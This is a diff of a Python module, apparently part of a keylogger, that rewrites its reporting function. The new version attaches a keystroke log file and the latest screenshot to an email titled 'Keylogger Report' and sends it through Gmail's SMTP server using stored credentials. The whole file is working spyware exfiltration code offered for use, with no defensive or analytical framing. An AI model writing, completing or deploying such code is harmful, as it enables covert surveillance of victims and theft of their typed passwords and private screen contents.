@@ -1,31 +1,39 @@
 import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-import db
 import os
+import mimetypes
+from email.message import EmailMessage
 
-def send_report():
-    """Send email report with keylogs and screenshots."""
-    sender = os.getenv("SENDER_EMAIL")
-    password = os.getenv("SENDER_PASSWORD")
-    receiver = os.getenv("RECEIVER_EMAIL")
+# Load environment variables
+EMAIL_SENDER = os.getenv("SENDER_EMAIL")
+EMAIL_PASSWORD = os.getenv("SENDER_PASSWORD")
+EMAIL_RECEIVER = os.getenv("RECEIVER_EMAIL")
 
-    msg = MIMEMultipart()
-    msg["From"] = sender
-    msg["To"] = receiver
-    msg["Subject"] = "Monitoring Report"
-
-    logs = db.get_logs()
-    body = "\n".join(logs)
-
-    msg.attach(MIMEText(body, "plain"))
-
-    # Send email
+def send_email():
     try:
-        with smtplib.SMTP("smtp.gmail.com", 587) as server:
-            server.starttls()
-            server.login(sender, password)
+        msg = EmailMessage()
+        msg["Subject"] = "Keylogger Report"
+        msg["From"] = EMAIL_SENDER
+        msg["To"] = EMAIL_RECEIVER
+        msg.set_content("Attached are the latest keystroke logs and screenshots.")
+
+        # Attach Keystroke Log (text file)
+        log_filename = "keystrokes.txt"
+        if os.path.exists(log_filename):
+            with open(log_filename, "rb") as f:
+                msg.add_attachment(f.read(), maintype="text", subtype="plain", filename=log_filename)
+
+        # Attach Latest Screenshot (image file)
+        screenshot_filename = "latest_screenshot.png"
+        if os.path.exists(screenshot_filename):
+            with open(screenshot_filename, "rb") as f:
+                msg.add_attachment(f.read(), maintype="image", subtype="png", filename=screenshot_filename)
+
+        # Send the email
+        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
             server.send_message(msg)
-        print("Report sent successfully.")
+
+        print("✅ Email Sent Successfully!")
+
     except Exception as e:
-        print(f"Failed to send email: {e}")
+        print(f"❌ Email Error: {e}")
